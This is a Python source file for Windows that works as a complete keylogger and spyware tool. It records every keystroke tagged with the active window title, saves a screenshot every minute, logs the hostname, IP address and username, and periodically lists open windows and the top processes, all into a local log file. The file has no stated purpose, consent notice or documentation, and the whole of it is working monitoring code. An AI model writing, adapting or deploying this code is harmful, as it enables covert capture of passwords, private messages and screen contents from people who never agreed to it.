import keyboard
import time
import os
import socket
import platform
import getpass
from datetime import datetime
import threading
import pyautogui
import win32gui
import psutil

LOG_FILE = "keylog.txt"
SCREENSHOT_INTERVAL = 60
SCREENSHOT_FOLDER = "screenshots"
ACTIVE_WINDOW_LOG_INTERVAL = 10

def prepare_directories():
    if not os.path.exists(SCREENSHOT_FOLDER):
        os.makedirs(SCREENSHOT_FOLDER)

def collect_system_info():
    info = {
        "Hostname": socket.gethostname(),
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "Operating System": platform.system(),
        "OS Version": platform.version(),
        "User": getpass.getuser(),
        "Start Time": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    
    info_text = "=== System Information ===\n"
    for key, value in info.items():
        info_text += f"{key}: {value}\n"
    
    with open(LOG_FILE, "a") as log_file:
        log_file.write(f"\n\n{info_text}\n\n")
    
    return info

def log_keystroke(event):
    key = event.name
    
    if len(key) > 1:
        if key == "space":
            key = " "
        elif key == "enter":
            key = "\n"
        elif key == "tab":
            key = "\t"
        elif key == "backspace":
            key = "[BACKSPACE]"
        elif key in ["shift", "ctrl", "alt"]:
            key = f"[{key.upper()}]"
        else:
            key = f"[{key.upper()}]"
    
    try:
        window = win32gui.GetForegroundWindow()
        window_title = win32gui.GetWindowText(window)
    except:
        window_title = "Unknown Window"
    
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"{timestamp} [{window_title}]: {key}"
    
    with open(LOG_FILE, "a") as log_file:
        log_file.write(log_entry)

def take_screenshot():
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        screenshot_file = os.path.join(SCREENSHOT_FOLDER, f"screenshot_{timestamp}.png")
        
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_file)
        
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"\n[SCREENSHOT TAKEN: {screenshot_file}]\n")
        
        return True, screenshot_file
    except Exception as e:
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"\n[SCREENSHOT ERROR: {str(e)}]\n")
        return False, None

def get_active_processes():
    """Captures active processes with resource usage"""
    processes = []
    for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_info']):
        try:
            process_info = proc.info
            memory_mb = round(process_info['memory_info'].rss / (1024 * 1024), 2)
            processes.append({
                'pid': process_info['pid'],
                'name': process_info['name'],
                'user': process_info['username'],
                'memory_mb': memory_mb
            })
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    
    return sorted(processes, key=lambda p: p['memory_mb'], reverse=True)[:10]

def track_active_applications():
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        def enum_windows_callback(hwnd, results):
            if win32gui.IsWindowVisible(hwnd) and win32gui.GetWindowText(hwnd) != '':
                results.append((hwnd, win32gui.GetWindowText(hwnd)))
            return True
        
        active_windows = []
        win32gui.EnumWindows(enum_windows_callback, active_windows)
        
        top_processes = get_active_processes()
        
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"\n[ACTIVE APPLICATIONS {timestamp}]\n")
            log_file.write("-- Active Windows --\n")
            for hwnd, title in active_windows:
                log_file.write(f"- {title}\n")
            
            log_file.write("\n-- Top Processes (by memory usage) --\n")
            for proc in top_processes:
                log_file.write(f"- {proc['name']} (PID: {proc['pid']}, Memory: {proc['memory_mb']} MB)\n")
            log_file.write("[END ACTIVE APPLICATIONS]\n\n")
        
        return True
    
    except Exception as e:
        return False # Ich hasse exceptions

def screenshot_task():
    while True:
        time.sleep(SCREENSHOT_INTERVAL)
        success, screenshot_file = take_screenshot()

def window_tracker_task():
    while True:
        time.sleep(ACTIVE_WINDOW_LOG_INTERVAL)
        track_active_applications()

def main():
    
    prepare_directories()
    system_info = collect_system_info()   
    keyboard.on_release(log_keystroke)
    
    screenshot_thread = threading.Thread(target=screenshot_task, daemon=True)
    window_thread = threading.Thread(target=window_tracker_task, daemon=True)

    screenshot_thread.start()
    window_thread.start()
    
    try:
        while True:
            time.sleep(.1)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()